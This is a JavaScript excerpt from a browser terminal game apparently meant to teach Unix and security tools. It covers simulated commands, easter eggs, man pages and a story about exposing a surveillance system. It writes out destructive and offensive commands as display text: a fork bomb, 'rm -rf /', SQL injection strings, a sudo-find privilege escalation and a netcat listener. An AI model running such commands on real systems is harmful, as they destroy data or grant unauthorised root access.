			if (content.includes("CHIMERA"))
				results.push({ t: "warn", s: "⚠ References CHIMERA" });
			if (content.includes("password") || content.includes("PASSWORD"))
				results.push({ t: "warn", s: "⚠ Contains password references" });
			if (content.includes("ENCRYPTED") || content.includes("LOCKED"))
				results.push({ t: "warn", s: "⚠ Encrypted/locked content" });
			if (content.startsWith("#!"))
				results.push({
					t: "info",
					s: `✓ Executable script: ${content.split("\n")[0]}`,
				});
			results.push({
				t: "dim",
				s: `\nLines: ${content.split("\n").length}  |  Size: ${content.length} bytes`,
			});
			return results;
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 20: ARG / META / EASTER EGGS
		// ═══════════════════════════════════════════════════════════════

		h.reality = () => {
			gs.triggerBeat("reality_check");
			gs.addXP(30);
			return [
				{ t: "warn", s: "" },
				{ t: "warn", s: "[WATCHER]: You found the door." },
				{ t: "warn", s: "" },
				{ t: "dim", s: "This system is a simulation inside a simulation." },
				{
					t: "dim",
					s: "DevMentor is the outer shell. Terminal Depths is the inner world.",
				},
				{
					t: "dim",
					s: "The skills you learn here are real. The barriers between simulations are thin.",
				},
				{ t: "dim", s: "" },
				{
					t: "dim",
					s: "Proof: check /dev/.watcher — that file shouldn't exist.",
				},
				{ t: "dim", s: "Check /var/log/.nexus_trace.log — hidden with a dot." },
				{
					t: "dim",
					s: "Check /proc/1337/environ — the daemon's environment leaks everything.",
				},
				{ t: "dim", s: "" },
				{ t: "warn", s: "Type `signal` to contact the Watcher." },
				{ t: "warn", s: "Type `ascend` when you're ready to leave." },
			];
		};

		h.glitch = () => {
			const el = document.getElementById("output");
			if (el) {
				el.style.animation = "none";
				el.classList.add("glitch");
				setTimeout(() => el.classList.remove("glitch"), 500);
			}
			gs.addXP(10);
			const noises = ["▓▒░", "█░▒", "▒▓█", "░█▓"];
			return [
				{
					t: "error",
					s: `${noises[Math.floor(Math.random() * 4)]} SIGNAL DEGRADATION ${noises[Math.floor(Math.random() * 4)]}`,
				},
				{
					t: "warn",
					s: `Reality coherence: ${(60 + Math.random() * 30).toFixed(1)}%`,
				},
				{ t: "dim", s: "The simulation is aware of your presence." },
				{ t: "dim", s: "Watcher has flagged your session." },
				{ t: "warn", s: "Type `ascend` when you are ready to exit." },
			];
		};

		h.ascend = () => {
			gs.addXP(200);
			gs.unlock("ascended");
			return [
				{ t: "system", s: "" },
				{
					t: "system",
					s: "╔══════════════════════════════════════════════════╗",
				},
				{
					t: "system",
					s: "║              ASCENSION PROTOCOL                  ║",
				},
				{
					t: "system",
					s: "║     GHOST has transcended Node-7                 ║",
				},
				{
					t: "system",
					s: "╚══════════════════════════════════════════════════╝",
				},
				{ t: "dim", s: "" },
				{ t: "info", s: "Mission status: COMPLETE" },
				{ t: "success", s: "CHIMERA: EXPOSED" },
				{ t: "success", s: "Evidence: EXFILTRATED" },
				{ t: "success", s: "Operative: ASCENDED" },
				{ t: "dim", s: "" },
				{ t: "dim", s: "The skills are real. The knowledge persists." },
				{
					t: "dim",
					s: "You can now navigate any Unix system with confidence.",
				},
				{
					t: "dim",
					s: "The commands you learned: pwd, ls, cat, grep, find, pipe,",
				},
				{
					t: "dim",
					s: "  nmap, nc, sudo, base64, openssl, ps, systemctl — these",
				},
				{ t: "dim", s: "  work on every Linux server on earth." },
				{ t: "dim", s: "" },
				{
					t: "warn",
					s: "Return to DevMentor to continue: ← DevMentor Console",
				},
				{ t: "dim", s: "" },
				{ t: "xp", s: "+200 XP | Achievement: ASCENDED | Mission: COMPLETE" },
			];
		};

		h.chimera = (args) => {
			if (!args.length)
				return [
					{ t: "warn", s: "CHIMERA: the target." },
					{
						t: "dim",
						s: "Check: /opt/chimera/, /var/log/chimera.log, /proc/1337/",
					},
					{ t: "dim", s: "Connect: nc chimera-control 8443" },
					{ t: "dim", s: "Exploit: exploit chimera (after getting root)" },
				];
			return [{ t: "dim", s: `chimera: ${args.join(" ")}` }];
		};

		h.watcher = () => h.talk(["watcher"]);

		h.inject = (args) => [
			{
				t: "warn",
				s: "[WATCHER]: Nice idea. But you can't inject into the simulation from within it.",
			},
			{ t: "dim", s: "The escape route is: ascend." },
		];

		h.escape = () => [
			{ t: "warn", s: "[SYSTEM]: Escape attempt detected." },
			{ t: "dim", s: "There is no exit. Only ascension." },
			{ t: "warn", s: "Type `ascend` to transcend the simulation." },
		];

		h.exit =
			h.logout =
			h.quit =
				() => [
					{ t: "warn", s: "There is no exit." },
					{ t: "dim", s: "You cannot log out of yourself." },
					{ t: "dim", s: "Type `ascend` to transcend." },
				];

		h.shutdown =
			h.halt =
			h.poweroff =
				(args) => [
					{ t: "warn", s: "[SYSTEM]: Shutdown requested..." },
					{ t: "warn", s: "Broadcast message from ghost@node-7:" },
					{ t: "error", s: "The system is going down for maintenance NOW!" },
					{ t: "dim", s: "" },
					{ t: "dim", s: "..." },
					{ t: "dim", s: "" },
					{ t: "info", s: "[Simulation safeguard activated]" },
					{ t: "dim", s: "(Cannot shut down Node-7 — the mission isn't over)" },
				];

		h.reboot = () => [
			{ t: "warn", s: "Rebooting..." },
			{ t: "dim", s: "..." },
			{ t: "info", s: "[SYSTEM BOOT SEQUENCE]" },
			{ t: "dim", s: "Initializing Ghost process... OK" },
			{ t: "dim", s: "Loading identity matrix... OK" },
			{ t: "info", s: "Welcome back. The trace is still running." },
		];

		h[";drop"] =
			h["1=1"] =
			h["'or'"] =
				() => [
					{ t: "warn", s: "' OR '1'='1" },
					{ t: "dim", s: "Nice try. This is a terminal, not a web form." },
					{
						t: "dim",
						s: "[CYPHER]: SQL injection goes in the database layer, not the shell. Try sqlmap on the API.",
					},
				];

		h[":(){ :|:& };:"] = () => [
			{ t: "error", s: "FORK BOMB DETECTED" },
			{ t: "warn", s: ":(){ :|:& };: — the classic fork bomb" },
			{
				t: "dim",
				s: "In a real system: spawns processes until system freezes.",
			},
			{ t: "dim", s: "Prevention: ulimit -u 50 (limit user processes)" },
			{ t: "info", s: "[Simulation safeguard activated — Node-7 protected]" },
		];

		h["sudo rm -rf /"] = h["rm -rf /"] = () => h.rm(["-rf", "/"]);

		h["make love"] = h.love = () => [
			{ t: "warn", s: "Not war?" },
			{ t: "dim", s: "Compiling love.c... OK" },
			{ t: "dim", s: "Linking hearts... OK" },
			{ t: "dim", s: "Installing: /usr/local/bin/love" },
			{
				t: "warn",
				s: "[ADA-7]: Focus. We can celebrate after CHIMERA is down.",
			},
		];

		h.make = (args) => {
			if (args[0] === "love") return h["make love"]();
			if (args[0] === "war")
				return [{ t: "error", s: "make: war not found. Try: make love" }];
			if (args[0] === "money")
				return [
					{
						t: "error",
						s: "make: target 'money' not in Makefile.\n(hint: learn to code, work at a startup)",
					},
				];
			const target = args[0] || "all";
			return [
				{
					t: "error",
					s: `make: *** No rule to make target '${target}'. Stop.`,
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 21: FUN / UNIX CULTURE
		// ═══════════════════════════════════════════════════════════════

		h.fortune = () => {
			const fortunes = [
				"A hacker is someone who enjoys the intellectual challenge of creatively overcoming limitations.",
				"Security is a process, not a product. — Bruce Schneier",
				"The quieter you become, the more you can hear. — Kali Linux motto",
				"rm -rf / is not a solution. Usually.",
				"In God we trust. All others we monitor.",
				"There are only two hard things in CS: cache invalidation, naming things, and off-by-one errors.",
				"The best way to predict the future is to invent it. — Alan Kay",
				"sudo make me a sandwich. — xkcd #149",
				"It's not a bug, it's an undocumented feature.",
				"Never trust a computer you can't throw out a window. — Steve Wozniak",
				"640K ought to be enough for anybody. — Bill Gates (apocryphal)",
				"If debugging is the process of removing bugs, then programming must be the process of putting them in.",
				"Any sufficiently advanced technology is indistinguishable from magic. — Arthur C. Clarke",
				"The Unix philosophy: Write programs that do one thing and do it well.",
				"There is no patch for human stupidity. — Sun Microsystems",
				"Arguing that you have nothing to hide because you have nothing to fear is like saying you don't care about free speech because you have nothing to say.",
				"Privacy is not something that I'm merely entitled to, it's an absolute prerequisite. — Marlon Brando",
			];
			return [
				{ t: "dim", s: fortunes[Math.floor(Math.random() * fortunes.length)] },
			];
		};

		h.cowsay = (args) => {
			const msg = args.join(" ") || "Moo?";
			const len = msg.length + 2;
			const border = "-".repeat(len);
			return [
				{ t: "dim", s: ` ${border}` },
				{ t: "dim", s: `< ${msg} >` },
				{ t: "dim", s: ` ${border}` },
				{ t: "dim", s: "        \\   ^__^" },
				{ t: "dim", s: "         \\  (oo)\\_______" },
				{ t: "dim", s: "            (__)\\       )\\/\\" },
				{ t: "dim", s: "                ||----w |" },
				{ t: "dim", s: "                ||     ||" },
			];
		};

		h.ponysay = (args) => {
			const msg = args.join(" ") || "...actually I prefer Python.";
			return [
				{ t: "dim", s: `  ${msg}` },
				{ t: "dim", s: "   \\" },
				{ t: "dim", s: "    \\ ,   ,  . ." },
				{ t: "dim", s: "     |  __   __|" },
				{ t: "dim", s: "     | /  \\_/  |" },
				{ t: "dim", s: "     | \\  /   /|  🦄" },
				{ t: "dim", s: "     |__\\_____/" },
			];
		};

		h.lolcat = (args) => {
			const msg = args.join(" ") || this._pipeStdin || "Rainbow!";
			const colors = [
				"#ff0000",
				"#ff8800",
				"#ffff00",
				"#00ff00",
				"#0088ff",
				"#aa00ff",
			];
			return msg.split("").map((c, i) => ({
				t: "raw-char",
				char: c,
				color: colors[Math.floor(i / 3) % colors.length],
			}));
		};

		h.cmatrix = () => {
			const cols = 70;
			const chars = "01アイウエオカキクケコサシスセソタチツテトナニ".split("");
			const lines = [];
			for (let i = 0; i < 20; i++) {
				lines.push(
					Array.from(
						{ length: cols },
						() => chars[Math.floor(Math.random() * chars.length)],
					).join(""),
				);
			}
			return [
				{
					t: "success",
					s:
						lines.join("\n") + "\n(In real terminal: cmatrix — Ctrl+C to stop)",
				},
			];
		};

		h.sl = () => [
			{ t: "warn", s: "sl: command not found" },
			{ t: "dim", s: "Did you mean `ls`? The typo is legendary." },
			{ t: "dim", s: "" },
			{ t: "dim", s: "      ====        ________                ___________" },
			{ t: "dim", s: "  _D _|  |_______/        \\__I_I_____===__|_________|" },
			{ t: "dim", s: "   |(_)---  |   H\\________/ |   |        =|___ ___|" },
			{ t: "dim", s: "   /     |  |   H  |  |     |   |         ||_| |_||" },
			{ t: "dim", s: "  |      |  |   H  |__--------------------| [___] |" },
			{ t: "dim", s: "  | ________|___H__/__|_____/[][]~\\_______|       |" },
			{ t: "dim", s: "  |/ |   |-----------I_____I [][] []  D   |=======|__" },
		];

		h.figlet =
			h.banner =
			h.toilet =
				(args) => {
					const text = args.join(" ") || "GHOST";
					return [
						{ t: "system", s: ` ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗` },
						{ t: "system", s: `██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝` },
						{ t: "system", s: `██║  ███╗███████║██║   ██║███████╗   ██║   ` },
						{ t: "system", s: `██║   ██║██╔══██║██║   ██║╚════██║   ██║   ` },
						{ t: "system", s: `╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ` },
						{ t: "system", s: ` ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ` },
						{ t: "dim", s: `` },
						{ t: "dim", s: `(displaying: ${text})` },
					];
				};

		h.boxes = (args) => {
			const msg = args.join(" ") || "Hello!";
			const len = msg.length + 4;
			const border = "+" + "-".repeat(len) + "+";
			return [
				{ t: "dim", s: border },
				{ t: "dim", s: `|  ${msg}  |` },
				{ t: "dim", s: border },
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 22: HELP & DOCUMENTATION
		// ═══════════════════════════════════════════════════════════════

		h.help = (args) => {
			const level = parseInt(args[0]) || 1;
			if (level === 1)
				return [
					{ t: "system", s: "=== TERMINAL DEPTHS — HELP LEVEL 1 ===" },
					{ t: "dim", s: "" },
					{
						t: "info",
						s: "NAVIGATION:    pwd, ls [-la], cd, tree, find, locate, stat",
					},
					{
						t: "info",
						s: "FILES:         cat, head, tail, touch, mkdir, rm, cp, mv, file, xxd",
					},
					{
						t: "info",
						s: "TEXT:          grep [-riEvn], awk, sed, cut, sort, uniq, wc, tr, tee",
					},
					{ t: "info", s: "MATH:          bc, expr, seq, shuf" },
					{
						t: "info",
						s: "SYSTEM:        ps, top, kill, uname, free, df, du, dmesg, uptime, date",
					},
					{
						t: "info",
						s: "PROCESSES:     pgrep, pkill, lsof, nice, watch, crontab",
					},
					{
						t: "info",
						s: "USERS:         whoami, id, who, w, su, passwd, groups, last",
					},
					{
						t: "info",
						s: "NETWORK:       ping, curl, wget, nmap, ssh, ip, ss, dig, nc, telnet",
					},
					{
						t: "info",
						s: "SECURITY:      sudo [-l], find -perm, chmod, md5sum, openssl, base64",
					},
					{
						t: "info",
						s: "GAME:          tutorial, talk, ask, skills, inventory, trace, achievements",
					},
					{
						t: "info",
						s: "AGENTS:        agents, trust <name>, faction, relationship <a> <b>",
					},
					{
						t: "info",
						s: "INVESTIGATE:   mole, mole clues, mole suspects, expose <name>",
					},
					{ t: "dim", s: "" },
					{
						t: "dim",
						s: "Type `help 2` for security tools   `help 3` for programming",
					},
					{
						t: "dim",
						s: "Type `help 4` for containers/cloud  `help 5` for the ARG layer",
					},
					{
						t: "dim",
						s: "Type `man <command>` for detailed help on any command",
					},
					{
						t: "dim",
						s: "Type `tutorial` to start guided training (42 steps)",
					},
				];
			if (level === 2)
				return [
					{ t: "system", s: "=== HELP LEVEL 2 — SECURITY TOOLS ===" },
					{ t: "warn", s: "These are real tools. Use them responsibly." },
					{ t: "dim", s: "" },
					{
						t: "info",
						s: "RECON:         nmap [-sV -sC -A], masscan, gobuster, dirb, nikto",
					},
					{
						t: "info",
						s: "EXPLOITATION:  sqlmap, metasploit/msfconsole, searchsploit, exploit",
					},
					{
						t: "info",
						s: "PASSWORD:      john, hashcat, hydra, openssl passwd",
					},
					{
						t: "info",
						s: "CRYPTO:        openssl, gpg, ssh-keygen, base64, base32, rot13, caesar",
					},
					{
						t: "info",
						s: "NETWORK:       nc/netcat, socat, tcpdump, arp, traceroute",
					},
					{
						t: "info",
						s: "FORENSICS:     strings, xxd, strace, gdb, binwalk, exiftool, steghide",
					},
					{ t: "info", s: "FIREWALL:      iptables, ufw" },
					{ t: "info", s: "SERVICES:      systemctl, journalctl, service" },
					{ t: "dim", s: "" },
					{
						t: "dim",
						s: "Game: nc chimera-control 8443 | exploit chimera | exfil",
					},
				];
			if (level === 3)
				return [
					{ t: "system", s: "=== HELP LEVEL 3 — PROGRAMMING ===" },
					{
						t: "info",
						s: "LANGUAGES:     python3, node, ruby, perl, go, gcc, lua, java, rustc",
					},
					{
						t: "info",
						s: "PACKAGES:      apt install, pip install, npm install, cargo, gem",
					},
					{ t: "info", s: "               pkg install (game package manager)" },
					{
						t: "info",
						s: "GIT:           git status, log, add, commit, push, branch, diff",
					},
					{ t: "info", s: "EDITORS:       vim, nano, emacs, code" },
					{ t: "info", s: "BUILD:         make, gcc, cargo build, go build" },
					{ t: "dim", s: "Run: pkg list  to see installable tools" },
				];
			if (level === 4)
				return [
					{ t: "system", s: "=== HELP LEVEL 4 — CONTAINERS & CLOUD ===" },
					{
						t: "info",
						s: "CONTAINERS:    docker, docker-compose, kubectl, helm",
					},
					{ t: "info", s: "IaC:           terraform, ansible, vagrant" },
					{ t: "info", s: "CLOUD:         aws, gcloud, az" },
					{ t: "dim", s: "Game containers: docker ps  (chimera is in there)" },
				];
			if (level >= 5)
				return [
					{ t: "warn", s: `=== HELP LEVEL ${level} ===` },
					{
						t: "dim",
						s: level === 5 ? "The ARG layer. Type `reality` to begin." : "",
					},
					{
						t: "dim",
						s:
							level === 5
								? "Hidden commands: reality, glitch, ascend, signal, watcher, inject, escape"
								: "",
					},
					{
						t: "dim",
						s: level === 6 ? "The Watcher is aware. Type `talk watcher`." : "",
					},
					{
						t: "dim",
						s: level === 7 ? "Check /dev/.watcher — it shouldn't exist." : "",
					},
					{
						t: "warn",
						s: level >= 8 ? "You're too deep. Type `ascend` to escape." : "",
					},
					{
						t: "error",
						s: level >= 9 ? "THE SIMULATION IS AWARE OF YOU. TYPE ASCEND." : "",
					},
					{
						t: "system",
						s:
							level >= 10
								? "Final truth: you were always the operative. The terminal was never a cage. Ascend."
								: "",
					},
				].filter((l) => l.s);
		};

		h.man = (args) => {
			const cmd = args[0];
			if (!cmd)
				return [
					{
						t: "error",
						s: "What manual page do you want? Usage: man <command>",
					},
				];
			const manuals = {
				ls: "ls(1) - list directory contents\n\nSYNOPSIS\n  ls [OPTION]... [FILE]...\n\nDESCRIPTION\n  List information about the FILEs (the current directory by default).\n\nOPTIONS\n  -a  do not ignore entries starting with .\n  -l  use a long listing format\n  -h  with -l, print sizes in human readable format\n  -r  reverse order while sorting\n  -t  sort by modification time, newest first\n  -S  sort by file size, largest first\n  -R  list subdirectories recursively\n\nEXAMPLES\n  ls -la     list all files, long format\n  ls -lhS    long, human sizes, sorted by size",
				grep: 'grep(1) - print lines matching a pattern\n\nSYNOPSIS\n  grep [OPTIONS] PATTERN [FILE]...\n\nDESCRIPTION\n  grep searches for PATTERN in each FILE.\n\nOPTIONS\n  -r  recursive (search directories)\n  -i  ignore case\n  -n  print line numbers\n  -v  invert match (print non-matching lines)\n  -E  extended regex (like egrep)\n  -P  Perl-compatible regex\n  -o  only print matching part\n  -c  count matching lines\n  -l  only print filenames\n  -q  quiet (exit code only)\n\nEXAMPLES\n  grep -r "CHIMERA" /var/log\n  grep -in "password" /etc/\n  cat file | grep -E "^[0-9]+"',
				find: 'find(1) - search for files in a directory hierarchy\n\nSYNOPSIS\n  find [starting-point] [expression]\n\nCOMMON EXPRESSIONS\n  -name PATTERN    filename matches shell pattern\n  -type f|d|l      file type (f=file, d=dir, l=symlink)\n  -perm MODE       permission mode\n  -size +N[ckMG]   file uses more than N units of space\n  -mtime -N        modified N days ago\n  -user NAME       owned by user\n  -exec CMD {} ;   execute CMD on each result\n  2>/dev/null      suppress permission errors\n\nEXAMPLES\n  find / -name "*.key" -type f 2>/dev/null\n  find / -perm -u=s -type f 2>/dev/null\n  sudo find . -exec /bin/sh \\;',
				nmap: "nmap(1) - Network exploration tool and security scanner\n\nSYNOPSIS\n  nmap [Scan Type] [Options] {target}\n\nSCAN TYPES\n  -sS  TCP SYN scan (stealth)\n  -sT  TCP connect scan\n  -sU  UDP scan\n  -sV  Version detection\n  -sC  Script scan (default scripts)\n  -O   OS detection\n  -A   Aggressive (OS + version + scripts + traceroute)\n\nTIMING\n  -T0 to -T5  paranoid to insane speed\n  -T2         stealth (IDS evasion)\n\nOUTPUT\n  -oN file    normal output\n  -oX file    XML output\n\nEXAMPLES\n  nmap -sV -sC -p 22,80,8443 192.168.1.100\n  nmap -A -T4 target.com",
				nc: 'nc(1) - arbitrary TCP/UDP connections and listens (netcat)\n\nSYNOPSIS\n  nc [options] hostname port\n  nc -l [options] [hostname] port\n\nDESCRIPTION\n  netcat is the TCP/IP swiss army knife.\n\nOPTIONS\n  -l  listen mode\n  -v  verbose\n  -n  numeric only (no DNS)\n  -p  local port\n  -e  program to exec after connect (some versions)\n  -z  zero-I/O mode (port scanning)\n  -w  timeout\n\nEXAMPLES\n  nc -lvp 4444           listen for incoming connections\n  nc 10.0.1.254 8443     connect to chimera control\n  echo "cmd" | nc host 80   send data\n  nc -z host 1-1000      scan ports 1-1000',
				sudo: "sudo(8) - execute a command as another user\n\nSYNOPSIS\n  sudo [OPTION] command\n\nOPTIONS\n  -l  list allowed (and forbidden) commands\n  -u user  run as specified user (default: root)\n  -i  simulate initial login\n  -s  run shell\n  !!  repeat last command with sudo\n\nPRIVILEGE ESCALATION\n  1. sudo -l              check what you can run\n  2. GTFOBins.github.io   find exploits\n  3. Example: sudo find . -exec /bin/sh \\;\n\nSECURITY\n  /etc/sudoers controls access\n  NOPASSWD means no password required\n  Misconfigured sudo = instant root",
				openssl:
					'openssl(1) - OpenSSL command line interface\n\nCOMMON SUBCOMMANDS\n  base64      encode/decode base64\n  enc         symmetric encryption\n  genrsa      generate RSA key\n  req         certificate requests\n  s_client    SSL/TLS client\n  passwd      hash passwords\n  dgst        digest (hash) files\n\nEXAMPLES\n  echo "hello" | openssl base64\n  openssl base64 -d <<< "aGVsbG8="\n  openssl enc -aes-256-cbc -in file -out file.enc -pbkdf2\n  openssl s_client -connect nexus.corp:443\n  openssl passwd -6 mypassword',
				awk: "awk(1) - pattern scanning and processing language\n\nSYNOPSIS\n  awk [options] 'program' [file...]\n\nFIELD VARIABLES\n  $0  entire line\n  $1  first field\n  $N  Nth field\n  NF  number of fields\n  NR  line number\n\nDELIMITER\n  -F:  colon delimiter\n  -F,  comma delimiter\n  -F'\\t'  tab delimiter\n\nEXAMPLES\n  cat /etc/passwd | awk -F: '{print $1}'\n  awk '{print $2}' file.txt\n  awk 'NR>1 {print}' file.txt    (skip header)\n  awk '/pattern/ {print $3}' log",
			};
			const m = manuals[cmd];
			if (m) return m.split("\n").map((s) => ({ t: "dim", s }));
			if (this._handlers[cmd])
				return [
					{
						t: "dim",
						s: `No manual entry for '${cmd}'.\nTry: ${cmd} --help\nOr:  help <level> for command categories`,
					},
				];
			return [{ t: "error", s: `No manual entry for '${cmd}'` }];
		};

		h.whatis = (args) => {
			const cmd = args[0];
			const descriptions = {
				ls: "ls (1) - list directory contents",
				grep: "grep (1) - print lines matching a pattern",
				find: "find (1) - search for files",
				nmap: "nmap (1) - network exploration tool",
				nc: "nc (1) - arbitrary TCP/UDP connections",
				sudo: "sudo (8) - execute as another user",
				awk: "awk (1) - pattern scanning language",
				sed: "sed (1) - stream editor",
				curl: "curl (1) - transfer a URL",
				python3: "python3 (1) - Python3 interpreter",
			};
			return [
				{
					t: "info",
					s: descriptions[cmd] || `${cmd} (1) - simulation command`,
				},
			];
		};

		h.apropos = (args) => {
			const pattern = args.join(" ").toLowerCase();
			const cmds = Object.keys(this._handlers).filter(
				(k) => k !== "_notfound" && k.includes(pattern),
			);
			return cmds.length
				? cmds.map((c) => ({
						t: "info",
						s: `${c} - type 'man ${c}' for details`,
					}))
				: [{ t: "error", s: `apropos: no results for '${pattern}'` }];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 23: SHELL MISC
		// ═══════════════════════════════════════════════════════════════

		h.clear = h.reset = () => {
			const el = document.getElementById("output");
			if (el) el.innerHTML = "";
			return [];
		};

		h.echo = h.echo; // already defined above
		h.printf = h.printf;

		h.read = (args) => [
			{
				t: "dim",
				s: `read: interactive input not available in simulation\nTo simulate: export VAR=value`,
			},
		];

		h.test = h["["] = (args) => {
			const expr = args.filter((a) => a !== "]").join(" ");
			return [
				{
					t: "dim",
					s: `[ ${expr} ] — test expression (exit code 0=true, 1=false)`,
				},
			];
		};

		h.true = () => [];
		h.false = () => [{ t: "dim", s: "(exit code: 1)" }];

		h.lsattr = (args) => {
			const file = args[0] || ".";
			return [{ t: "dim", s: `-------------e-- ${file}` }];
		};

		h.chattr = (args) => [{ t: "success", s: `chattr: ${args.join(" ")}` }];

		h.xclip =
			h.pbcopy =
			h.pbpaste =
				() => [
					{
						t: "dim",
						s: "Clipboard not available in browser terminal simulation.",
					},
				];

		h.tput = (args) => {
			if (args[0] === "cols") return [{ t: "info", s: "80" }];
			if (args[0] === "lines") return [{ t: "info", s: "24" }];
			return [];
		};

		h.stty = (args) => [
			{
				t: "dim",
				s: "speed 38400 baud; rows 24; columns 80; line = 0;\n(stty: terminal settings)",
			},
		];

		h.screen = (args) => [
			{
				t: "dim",
				s: "GNU Screen 4.9.0\nscreen: terminal multiplexer\nCtrl+A then d: detach  Ctrl+A then c: new window  Ctrl+A then n: next",
			},
		];

		h.tmux = (args) => {
			if (!args.length)
				return [
					{
						t: "info",
						s: "tmux: terminal multiplexer\nnew-session, list-sessions, attach-session -t name\nCtrl+B then d: detach  Ctrl+B then c: new window",
					},
				];
			if (args[0] === "new")
				return [
					{
						t: "success",
						s: `tmux: new session created: ${args[1] || "session-0"}`,
					},
				];
			return [{ t: "dim", s: `tmux ${args.join(" ")}: simulated` }];
		};

		h.ssh_tunnel = () => [
			{
				t: "dim",
				s: "ssh -L 8443:chimera-control:8443 ghost@nexus.corp\n(Forward remote port 8443 to localhost:8443)",
			},
		];

		h.ncat = h.nc;
		h.wget = h.wget;

		// ═══════════════════════════════════════════════════════════════
		// SECTION 22: FACTION SYSTEM
		// ═══════════════════════════════════════════════════════════════

		h.faction = (args) => {
			const sub = args[0];
			const state = gs.getState();

			if (!sub) {
				return [
					{ t: "system", s: "=== FACTION SYSTEM ===" },
					{ t: "dim", s: "" },
					{ t: "dim", s: "Your allegiance determines your late-game path." },
					{ t: "dim", s: "" },
					{ t: "warn", s: "  [RESISTANCE]" },
					{
						t: "dim",
						s: "  Ada's network. Expose CHIMERA. Build counter-surveillance.",
					},
					{ t: "dim", s: "  Command: faction join resistance" },
					{ t: "dim", s: "" },
					{ t: "info", s: "  [CORPORATION]" },
					{
						t: "dim",
						s: "  Nova's network. Access CHIMERA admin. Build surveillance.",
					},
					{ t: "dim", s: "  Command: faction join corp" },
					{ t: "dim", s: "" },
					state.faction
						? {
								t: "success",
								s: `Current faction: ${state.faction.toUpperCase()}`,
							}
						: {
								t: "dim",
								s: "Current faction: NONE — type `faction join <name>` to choose",
							},
				];
			}

			if (sub === "join") {
				const choice = args[1];
				if (!choice)
					return [{ t: "error", s: "Usage: faction join <resistance|corp>" }];

				if (choice === "resistance") {
					if (state.faction === "resistance")
						return [{ t: "dim", s: "You are already with the resistance." }];
					gs.setFaction("resistance");
					gs.addXP(75, "security");
					gs.unlock("resistance_member");
					gs.triggerBeat("faction_resistance");
					return [
						{ t: "system", s: "" },
						{ t: "warn", s: "╔═══════════════════════════════════════╗" },
						{ t: "warn", s: "║     RESISTANCE FACTION JOINED         ║" },
						{ t: "warn", s: "╚═══════════════════════════════════════╝" },
						{ t: "dim", s: "" },
						{ t: "warn", s: "[ADA-7]: Welcome to the resistance, Ghost." },
						{
							t: "dim",
							s: "[ADA-7]: New objective: retrieve CHIMERA source code from /opt/chimera/src/",
						},
						{
							t: "dim",
							s: "[ADA-7]: The source proves intent. Logs prove action. We need both.",
						},
						{ t: "dim", s: "" },
						{ t: "xp", s: "+75 XP — RESISTANCE_MEMBER | Achievement unlocked" },
					];
				}

				if (choice === "corp" || choice === "corporation") {
					if (state.faction === "corp")
						return [{ t: "dim", s: "You are already with NexusCorp." }];
					gs.setFaction("corp");
					gs.addXP(50);
					gs.unlock("corp_member");
					gs.triggerBeat("faction_corp");
					return [
						{ t: "system", s: "" },
						{ t: "info", s: "╔═══════════════════════════════════════╗" },
						{ t: "info", s: "║     NEXUSCORP FACTION JOINED          ║" },
						{ t: "info", s: "╚═══════════════════════════════════════╝" },
						{ t: "dim", s: "" },
						{ t: "info", s: "[NOVA]: Welcome, Ghost. Level 5 access granted." },
						{ t: "dim", s: "[NOVA]: Your trace has been paused. For now." },
						{
							t: "dim",
							s: "[NOVA]: Access /opt/chimera/ with your new clearance.",
						},
						{ t: "dim", s: "" },
						{ t: "warn", s: "[ADA-7]: Ghost... what have you done." },
						{ t: "dim", s: "" },
						{ t: "xp", s: "+50 XP — CORP_MEMBER | Achievement unlocked" },
					];
				}

				return [
					{
						t: "error",
						s: `faction join: unknown faction '${choice}'. Options: resistance, corp`,
					},
				];
			}

			if (sub === "status") {
				return [
					{ t: "system", s: "=== FACTION STATUS ===" },
					state.faction
						? { t: "success", s: `Faction: ${state.faction.toUpperCase()}` }
						: {
								t: "dim",
								s: "No faction. Type `faction join <resistance|corp>`",
							},
				];
			}

			if (sub === "leave") {
				if (!state.faction) return [{ t: "dim", s: "No faction to leave." }];
				const old = state.faction;
				gs.setFaction(null);
				return [
					{ t: "warn", s: `Left faction: ${old.toUpperCase()}` },
					{
						t: "dim",
						s: "You are now independent. Type `faction join` to re-align.",
					},
				];
			}

			return [
				{
					t: "error",
					s: "faction: unknown subcommand. Usage: faction [join <name>|status|leave]",
				},
			];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 23: MAP / TOPOLOGY
		// ═══════════════════════════════════════════════════════════════

		h.map = (args) => {
			const state = gs.getState();
			const hasRoot = state.achievements.has("root_obtained");
			const hasChi = state.achievements.has("chimera_connected");
			const hasExpl = state.achievements.has("chimera_exploited");
			gs.addXP(5, "networking");
			return [
				{ t: "system", s: "" },
				{
					t: "system",
					s: "╔══════════════════════════════════════════════════════╗",
				},
				{
					t: "system",
					s: "║       NEXUSCORP NETWORK TOPOLOGY — 10.0.1.0/24      ║",
				},
				{
					t: "system",
					s: "╚══════════════════════════════════════════════════════╝",
				},
				{ t: "dim", s: "" },
				{ t: "dim", s: "  INTERNET ─── GATEWAY (10.0.1.1)" },
				{ t: "dim", s: "                    │" },
				{ t: "dim", s: "        ┌───────────┴────────────────┐" },
				{ t: "dim", s: "        │                            │" },
				{
					t: "info",
					s: "  NEXUS.CORP (10.0.1.100)     NODE-7 (10.0.1.7)  ← YOU",
				},
				{ t: "dim", s: "  ports: 80, 3000                  port: 22" },
				{ t: "dim", s: "        │                            │" },
				{ t: "dim", s: "        └────────────────────────────┘" },
				{ t: "dim", s: "                    │" },
				{
					t: hasRoot ? "warn" : "dim",
					s: `  NEXUS-DB (10.0.1.50)  [${hasRoot ? "ACCESSIBLE" : "LOCKED — need root"}]`,
				},
				{ t: "dim", s: "  port: 5432" },
				{ t: "dim", s: "        │" },
				{
					t: hasExpl ? "error" : hasChi ? "success" : "dim",
					s: `  CHIMERA-CTRL (10.0.1.254)  [${hasExpl ? "COMPROMISED" : hasChi ? "CONNECTED" : "RESTRICTED"}]`,
				},
				{ t: "dim", s: "  port: 8443 (CHIMERA control socket)" },
				state.storyBeats.has("met_watcher")
					? { t: "warn", s: "        │" }
					: { t: "dim", s: "        │" },
